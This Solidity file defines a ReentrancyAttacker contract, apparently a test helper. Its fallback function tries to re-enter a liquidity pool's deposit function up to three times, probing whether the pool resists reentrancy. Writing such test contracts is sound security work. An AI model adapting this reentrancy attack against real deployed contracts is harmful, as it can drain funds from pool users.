// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ILiquidityPool } from "../interfaces/ILiquidityPool.sol";

contract ReentrancyAttacker {
    ILiquidityPool public liquidityPool;
    IERC20 public token;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _liquidityPool, address _token) {
        liquidityPool = ILiquidityPool(_liquidityPool);
        token = IERC20(_token);
        maxAttacks = 3;
    }

    function attack(uint256 amount) external {
        require(token.balanceOf(address(this)) >= amount, "Insufficient balance");
        token.approve(address(liquidityPool), amount);
        attackCount = 0;
        liquidityPool.deposit(amount);
    }

    fallback() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            // Try to reenter during the token transfer
            liquidityPool.deposit(1000);
        }
    }
}
